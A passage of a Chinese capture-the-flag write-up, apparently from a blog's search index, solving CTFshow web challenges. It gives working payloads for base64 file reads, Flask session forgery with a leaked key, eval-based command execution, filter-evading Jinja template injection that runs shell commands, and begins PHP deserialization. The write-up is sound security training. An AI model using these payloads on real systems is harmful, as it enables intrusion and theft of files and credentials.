<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFshow-第三届愚人杯web-wp</title>
      <link href="/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/"/>
      <url>/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h4><p><a href="https://ctf.show/challenges#easy_signin-3967">https://ctf.show/challenges#easy_signin-3967</a></p><p>首先给到一个url</p><p><a href="http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=">http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=</a></p><p>url后img为base64  ZmFjZS5wbmc=   =&gt; face.png</p><p>那可以直接读取源码，index.php,    index.php  =&gt; aW5kZXgucGhw</p><p>右键查看源代码即可看到</p><img src='data:image/png;base64,PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezRjNzJiODAwLTMzNjQtNGQ1NC05YWU0LTIwYTE4YzYxYTMxZn0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'/><p>pd9开头为&lt;?php 直接解密即可</p><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406144147722.png" alt="image-20230406144147722"></p><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p><a href="https://ctf.show/challenges#easy_flask-3971">https://ctf.show/challenges#easy_flask-3971</a></p><p>打开题目连接是一个登录框，可以进行用户注册</p><p>可以参考这篇文章</p><p><code>https://blog.csdn.net/since_2020/article/details/119543172</code></p><p>随便一个用户注册，123/123登录上去，可以看到learn可以点击，查看到源代码</p><p>有一个<code>app.secret_key = &#39;S3cr3tK3y&#39;</code>最为显眼，联想到flask session伪造，</p><p>可以重新登录抓包，看是否有session</p><p>Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA</p><p>可以看到session jwt相似用<code>https://github.com/noraj/flask-session-cookie-manager</code>这个工具可以进行解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA&quot; -s &quot;S3cr3tK3y&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: True, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到有role值为user，源码中未见管理员的字样，盲猜为admin，接着构造包</p><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161237019.png" alt="image-20230406161237019"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &quot;S3cr3tK3y&quot; -t &quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;123&#x27;&#125;&quot;</span></span><br><span class="line">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.ZC5-7A.6id7rF3wmWSp5nux_ylHGAhfbn8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将构造好的数据进行替换session，这样</p><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161503735.png" alt="image-20230406161503735"></p><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161453957.png" alt="image-20230406161453957"></p><p>再次访问主页面，即可看到主页面多了一个下载的地方，</p><p><a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txt%EF%BC%8C%E7%82%B9%E5%87%BB%E6%97%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E5%9C%A8%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9C%8B%E5%88%B0show%E7%9B%AE%E5%BD%95%E6%97%B6%EF%BC%8C%E5%B7%A6%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AAapp.py%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txt，点击时任意文件下载，接下来就下载源码，在最开始看到show目录时，左上角有一个app.py直接下载，下载后可以看到源码</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hello路由处有个eval漏洞，这样传参是很危险的，</p><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161902169.png" alt="image-20230406161902169"></p><p>参考</p><p><code>https://www.anquanke.com/post/id/84891/</code></p><p>``<a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen</a>(‘cat /flag_is_h3re’).read()`</p><p>即可</p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>右键源代码有zip包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hellodear</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> if “ge” in name:<br>        return render_template_string(‘hello %s’ % name)</p><p>payload 要有  ge</p><p> elif “f” not in name:<br>        return render_template_string(‘hello %s’ % name)</p><p>payload 不能有f</p><p>先获取可用基类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">三种方法皆可</span><br><span class="line">1,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">2,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">3,   &#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取到后，用脚本嗦一下可用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查找到的父类列表替换到data中</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br></pre></td></tr></table></figure><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406171826914.png" alt="image-20230406171826914"></p><p>可以看到132的os._wrap_close可用 popen也可用</p><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code>即可命令执行</p><p>但是下面执行ls / 时几句不可以了，显示404</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;$(echo bHM= | base64 -d) $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat $(echo Li4vZmxhZw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">官方</span><br><span class="line">/hello/&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](request.args.get(<span class="string">&quot;ctfshow&quot;</span>)).<span class="built_in">read</span>()&#125;&#125;ge?ctfshow=cat /flag </span><br><span class="line"></span><br><span class="line">POC1:</span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC2:</span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC3:</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat $(echo Li4vZmxhZw== | base64 -d)').read()&#125;&#125;</code></p><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><p>开局给了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显然是反序列化，这里要知道一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 